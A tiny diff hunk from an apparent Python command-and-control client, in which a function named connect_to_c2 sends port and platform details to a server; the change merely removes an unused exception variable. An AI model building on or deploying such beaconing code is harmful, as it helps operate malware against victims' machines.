@@ -65,7 +65,7 @@ def connect_to_c2():
                 'port': config['port'],
                 'platform': get_platform_info()
             })
-    except rq.exceptions.ConnectionError as e:
+    except rq.exceptions.ConnectionError:
         return False      
     return resp.json()['success']
 
